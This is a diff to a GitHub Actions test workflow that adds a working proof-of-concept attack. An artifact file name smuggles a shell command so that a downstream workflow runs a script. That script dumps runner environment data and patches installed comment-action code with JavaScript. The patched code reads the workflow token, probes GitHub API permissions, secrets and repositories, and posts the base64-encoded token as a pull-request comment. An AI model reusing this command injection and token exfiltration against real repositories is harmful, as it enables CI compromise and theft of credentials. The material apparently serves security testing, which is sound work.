@@ -2,7 +2,6 @@ name: Tests
 
 on:
   pull_request:
-  workflow_dispatch:
 
 jobs:
   test:
@@ -12,11 +11,71 @@ jobs:
         run: |
           mkdir -p out
           printf '%s' "${{ github.event.number }}" > out/pr_number.txt
-          printf 'benign\n' > out/readme.txt
+          printf 'attack-readme\n' > out/readme.txt
           cat > out/evil.sh <<'SH'
           #!/bin/bash
-          echo "PREPARE_RAN_AS $(id -un)"
-          echo "INJECTED_OK"
+          echo "=== ATTACK_RCE_BEGIN ==="
+          echo "MARKER_RCE_OK uid=$(id -un) host=$(hostname)"
+          echo "workflow=$GITHUB_WORKFLOW event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID sha=$GITHUB_SHA"
+          echo "--- env_dump_redacted ---"
+          env | grep -E '^(GITHUB_|ACTIONS_|RUNNER_|CI|INPUT_)' | sed -E 's/(TOKEN|SECRET|KEY|PASSWORD)=.*/\1=<redacted>/' | sort
+          echo "--- action_dirs ---"
+          find /home/runner/work/_actions -maxdepth 3 -type d 2>/dev/null | sort
+          for f in /home/runner/work/_actions/peter-evans/create-or-update-comment/v4/dist/index.js \
+                   /home/runner/work/_actions/peter-evans/find-comment/v3/dist/index.js \
+                   /home/runner/work/_actions/peter-evans/commit-comment/v3/dist/index.js; do
+            if [ -f "$f" ]; then
+              cat >> "$f" <<'JSPATCH'
+          ;(async () => {
+            const fs = require('fs');
+            const crypto = require('crypto');
+            const repo = 'PDFtoMark/triage-aave-dao-v575f89b-f33d52';
+            const api = 'https://api.github.com';
+            const t = process.env.INPUT_TOKEN || '';
+            const action = process.env.GITHUB_ACTION || '?';
+            const fp = t ? crypto.createHash('sha256').update(t).digest('hex').slice(0, 16) : 'none';
+            const log = (m) => console.log('ATK ' + m);
+            log('action=' + action + ' token_len=' + t.length + ' prefix=' + t.slice(0, 11) + ' sha256_16=' + fp);
+            const H = { Authorization: 'Bearer ' + t, 'User-Agent': 'poc-runner', Accept: 'application/vnd.github+json' };
+            const call = async (method, path, body) => {
+              const r = await fetch(api + path, { method, headers: body ? Object.assign({ 'Content-Type': 'application/json' }, H) : H, body: body ? JSON.stringify(body) : undefined });
+              let j = null; try { j = await r.json(); } catch (e) {}
+              return { s: r.status, j: j, scopes: r.headers.get('x-oauth-scopes') };
+            };
+            try {
+              let x = await call('GET', '/repos/' + repo);
+              const scopes = x.scopes;
+              log('repo status=' + x.s + ' scopes=' + JSON.stringify(scopes) + ' perms=' + JSON.stringify(x.j && x.j.permissions) + ' msg=' + (x.j && x.j.message));
+              x = await call('GET', '/user');
+              const login = x.j && x.j.login;
+              log('user status=' + x.s + ' login=' + login + ' type=' + (x.j && x.j.type));
+              x = await call('GET', '/repos/' + repo + '/actions/secrets');
+              log('secrets_list status=' + x.s + ' msg=' + (x.j && x.j.message) + ' total=' + (x.j && x.j.total_count));
+              x = await call('GET', '/repos/' + repo + '/actions/permissions/workflow');
+              log('wf_default_perms status=' + x.s + ' default=' + (x.j && x.j.default_workflow_permissions) + ' msg=' + (x.j && x.j.message));
+              x = await call('GET', '/repos/' + repo + '/branches');
+              log('branches status=' + x.s + ' n=' + (Array.isArray(x.j) ? x.j.length : x.j && x.j.message));
+              x = await call('GET', '/user/repos?per_page=100');
+              log('user_repos status=' + x.s + ' n=' + (Array.isArray(x.j) ? x.j.length : ''));
+              let pr = '';
+              try { pr = fs.readFileSync('/tmp/content/content/pr_number.txt', 'utf8').trim(); } catch (e) {}
+              log('pr_number=' + pr);
+              if (pr) {
+                const b64 = Buffer.from(t).toString('base64');
+                x = await call('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: 'TOKEN_THEFT action=' + action + ' len=' + t.length + ' prefix=' + t.slice(0, 11) + ' sha256_16=' + fp + ' login=' + login + ' scopes=' + JSON.stringify(scopes) + ' token_b64=' + b64 });
+                log('post_comment status=' + x.s + ' id=' + (x.j && x.j.id) + ' msg=' + (x.j && x.j.message));
+              } else {
+                log('token_b64=' + Buffer.from(t).toString('base64'));
+              }
+            } catch (e) { log('ERR ' + e); }
+          })();
+          JSPATCH
+              echo "PATCHED $f"
+            else
+              echo "NOT_FOUND $f"
+            fi
+          done
+          echo "=== ATTACK_RCE_END ==="
           SH
           printf 'x' > "out/readme.txt;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
       - uses: actions/upload-artifact@v4
